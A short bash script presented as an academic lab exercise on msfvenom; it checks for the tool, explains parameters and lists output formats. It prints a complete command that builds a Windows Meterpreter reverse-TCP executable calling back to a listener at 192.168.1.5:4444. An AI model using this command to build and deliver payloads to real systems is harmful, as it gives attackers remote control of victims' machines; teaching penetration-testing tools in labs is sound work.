#!/bin/bash
# ==============================================================================
# Experiment 20: Payload Generation Using MSFVenom (Academic / Educational Demonstration)
# ==============================================================================

echo "=========================================================="
echo "  Experiment 20: MSFVenom Educational Demonstration"
echo "=========================================================="

echo "Examining MSFVenom tool availability..."

if ! command -v msfvenom &> /dev/null; then
    echo "Notice: 'msfvenom' is not installed in the current environment."
    echo "Metasploit framework is standard on Kali Linux."
fi

echo -e "\nAcademic Command Syntax:"
echo "--------------------------------------------------------"
echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe"

echo -e "\nPayload architecture and parameter analysis:"
echo "--------------------------------------------------------"
echo "  Payload: windows/meterpreter/reverse_tcp"
echo "  LHOST (Local Host / Listener IP): 192.168.1.5"
echo "  LPORT (Local Port / Listener Port): 4444"
echo "  Format (-f): Portable Executable (.exe)"

echo -e "\nListing available payload formats (--help-formats):"
if command -v msfvenom &> /dev/null; then
    msfvenom --help-formats 2>/dev/null | head -n 15
else
    echo "Executable formats: asp, aspx, dll, elf, exe, jar, msi, psh, raw, vbs, war"
fi

echo -e "\nExperiment 20 academic review completed."
